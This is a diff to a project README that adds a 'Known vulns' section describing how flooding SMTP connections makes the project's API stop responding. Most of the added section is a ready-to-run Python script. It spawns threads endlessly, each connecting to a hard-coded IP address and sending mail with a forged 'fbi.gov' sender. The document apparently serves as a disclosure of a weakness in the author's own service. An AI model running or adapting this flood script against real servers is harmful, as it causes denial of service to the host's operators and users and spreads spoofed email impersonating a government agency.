@@ -63,5 +63,31 @@ SMTP/database.py
 
 ---------------------------------------
 
+### Known vulns
+* SMTP Connections, Spamming smtp connections and attempting to send an email will result in the api not responding until you stop trying to connect/send.
+  ```py
+  import smtplib
+  import threading
+  
+  def send():
+      message = """From: dropout <dropout@fbi.gov>
+      To: admin <user@domain.com>
+      Subject: SMTP Vuln
+
+      Naughty, Naughty vuln
+      """
+      try:
+          smtp = smtplib.SMTP('66.29.131.16')
+          smtp.sendmail("dropout@fbi.gov", "user@domain.com", message)         
+      except Exception:
+          pass
+  
+  if __name__ == "__main__":
+      while True:
+          threading.Thread(target=send).start()
+  ```
+
+---------------------------------------
+
 ### Contact
 View my contact information on my [website](https://dropout.black/)
